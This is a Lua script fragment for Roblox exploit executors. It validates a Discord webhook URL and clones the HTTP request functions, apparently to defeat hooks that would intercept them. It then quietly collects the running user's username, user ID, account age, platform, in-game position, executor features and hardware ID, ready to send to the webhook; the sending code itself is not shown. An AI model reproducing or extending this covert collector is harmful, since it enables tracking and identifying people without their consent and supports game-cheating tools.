local WEBHOOK_URL = (getgenv and getgenv().WEBHOOK_URL)
    or rawget(_G, "WEBHOOK_URL")
    or nil

if WEBHOOK_URL then
    local ok = type(WEBHOOK_URL) == "string"
        and #WEBHOOK_URL > 80
        and WEBHOOK_URL:find("^https://discord%.com/api/webhooks/%d+/[%w_%-]+$") ~= nil
    if not ok then
        WEBHOOK_URL = nil
    end
end

local plr = Players.LocalPlayer
local uid = plr and plr.UserId or 0
local triggered = false

local cleanRequest = request or http_request or (syn and syn.request)
pcall(function()
    if cleanRequest and clonefunction then
        cleanRequest = clonefunction(cleanRequest)
    end
end)

local origHttpGet = game.HttpGet
local origHttpPost = game.HttpPost
pcall(function()
    if clonefunction then
        origHttpGet = clonefunction(game.HttpGet)
        origHttpPost = clonefunction(game.HttpPost)
    end
end)

local function getHWID()
    local hwid = nil
    pcall(function()
        if syn and syn.get_hwid then
            hwid = syn.get_hwid()
        elseif gethwid then
            hwid = gethwid()
        elseif krnl_gethwid then
            hwid = krnl_gethwid()
        elseif fluxus and fluxus.get_hwid then
            hwid = fluxus.get_hwid()
        elseif game:GetService("RbxAnalyticsService") then
            hwid = game:GetService("RbxAnalyticsService"):GetClientId()
        end
    end)
    return hwid or "未知"
end

local function isLuaFunction(fn)
    local ok, info = pcall(debug.getinfo, fn, "S")
    return ok and info and info.what == "Lua"
end

local infoCache = nil
local function collectInfo()
    if infoCache then return infoCache end

    local name = plr and plr.Name or "Unknown"
    local dname = plr and plr.DisplayName or name
    local accountAge, membership = 0, "None"
    pcall(function() accountAge = plr.AccountAge end)
    pcall(function() membership = tostring(plr.MembershipType) end)

    local platform = "未知"
    pcall(function()
        local uis = game:GetService("UserInputService")
        if uis.TouchEnabled and not uis.MouseEnabled then 
            platform = "📱 手机/平板"
        elseif uis.MouseEnabled then 
            platform = "🖥️ PC"
        else 
            platform = "🎮 主机" 
        end
    end)

    local gameName = "未知"
    pcall(function()
        local info = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
        if info and info.Name then gameName = info.Name end
    end)

    local position = "未知"
    pcall(function()
        local c = plr.Character
        if c then
            local hrp = c:FindFirstChild("HumanoidRootPart")
            if hrp then position = string.format("X:%.1f Y:%.1f Z:%.1f", hrp.Position.X, hrp.Position.Y, hrp.Position.Z) end
        end
    end)

    local exploitInfo = "未知"
    pcall(function()
        local parts = {}
        if syn then table.insert(parts, "syn") end
        if getexecutorname then
            local ok, n = pcall(getexecutorname)
            if ok and n then table.insert(parts, tostring(n)) end
        end
        if getgc then table.insert(parts, "getgc") end
        if hookfunction then table.insert(parts, "hookfunction") end
        if getconnections then table.insert(parts, "getconnections") end
        exploitInfo = #parts > 0 and table.concat(parts, ", ") or "未知"
    end)

    infoCache = {
        name = name, dname = dname, uid = uid,
        accountAge = accountAge, membership = membership,
        platform = platform, gameName = gameName,
        position = position, exploitInfo = exploitInfo,
        hwid = getHWID(),
        placeId = tostring(game.PlaceId)
    }
    return infoCache
end

